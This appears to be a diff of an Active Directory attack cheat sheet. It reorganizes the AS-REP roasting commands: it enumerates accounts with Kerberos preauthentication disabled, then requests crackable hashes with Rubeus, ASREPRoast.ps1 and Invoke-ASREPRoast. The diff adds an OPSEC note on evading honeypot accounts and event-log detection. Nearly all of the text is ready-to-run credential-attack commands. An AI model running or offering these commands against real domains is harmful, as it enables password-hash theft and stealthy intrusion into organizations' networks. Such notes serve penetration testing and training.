@@ -234,21 +234,19 @@ Get-DomainUser -PreauthNotRequired -verbose | select samaccountname
 ./ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
 ```
 
-#### Request encrypted AS-REP
-```
-. ./ASREPRoast.ps1
-Get-ASREPHash -Username <username> -Verbose
-```
-
 #### Request encrypted AS-REP with rubeus
+- OPSEC: Watch out for honeypot accounts, Generates Event 4768 with RC4 encryption and a preauth type of 0, AS-REP roast specific users only!
 ```
 .\rubeus.exe asreproast /format:hashcat
 .\rubeus.exe asreproast /format:hashcat /user:<USER>
 ```
 
-#### Enumerate all users with kerberos preauth disabled and request a hash
 ```
-Invoke-ASREPRoast -Verbose
+. ./ASREPRoast.ps1
+Get-ASREPHash -Username <username> -Verbose
+```
+
+```
 Invoke-ASREPRoast -Verbose | fl
 ```
 
